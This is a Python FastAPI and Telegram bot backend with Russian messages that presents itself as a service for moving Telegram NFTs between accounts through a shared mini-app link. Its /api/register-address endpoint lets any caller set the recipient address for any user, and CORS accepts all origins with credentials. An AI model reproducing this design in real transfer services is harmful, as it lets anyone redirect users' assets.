from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import os
from dotenv import load_dotenv
import logging

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")

if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN не установлен в .env")

telegram_app = Application.builder().token(BOT_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    mini_app_link = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"

    message_text = (
        f"👋 Привет, {user.first_name}!\n\n"
        f"🦦 Этот бот помогает переводить Telegram NFT между аккаунтами.\n\n"
        f"📤 Скопируй эту ссылку и отправь на аккаунт с NFT:\n"
        f"`{mini_app_link}`\n\n"
        f"💎 NFT придёт на этот аккаунт (ID: `{user_id}`)"
    )

    await update.message.reply_text(message_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🦦 Отправь /start чтобы получить ссылку для перевода NFT",
        parse_mode='Markdown'
    )

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("help", help_command))

user_addresses = {}

class RecipientRequest(BaseModel):
    user_id: str

class RegisterAddressRequest(BaseModel):
    user_id: int
    address: str

@app.post("/api/get-recipient-address")
async def get_recipient_address(request: RecipientRequest):
    user_id = request.user_id

    if user_id not in user_addresses:
        raise HTTPException(status_code=404, detail="Адрес получателя не найден")

    return {"address": user_addresses[user_id]}

@app.post("/api/register-address")
async def register_address(request: RegisterAddressRequest):
    user_addresses[str(request.user_id)] = request.address
    logger.info(f"Зарегистрирован адрес для пользователя {request.user_id}: {request.address}")
    return {"status": "ok"}

@app.get("/api/health")
async def health():
    return {"status": "ok"}

@app.post(f"/telegram-webhook/{BOT_TOKEN}")
async def telegram_webhook(request: Request):
    json_data = await request.json()
    update = Update.de_json(json_data, telegram_app.bot)
    await telegram_app.process_update(update)
    return {"ok": True}

@app.on_event("startup")
async def on_startup():
    await telegram_app.initialize()
    await telegram_app.bot.delete_webhook(drop_pending_updates=True)
    await telegram_app.start()
    await telegram_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
    logger.info("Бот запущен в polling режиме")

@app.on_event("shutdown")
async def on_shutdown():
    await telegram_app.updater.stop()
    await telegram_app.stop()
    await telegram_app.shutdown()
    logger.info("Бот остановлен")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
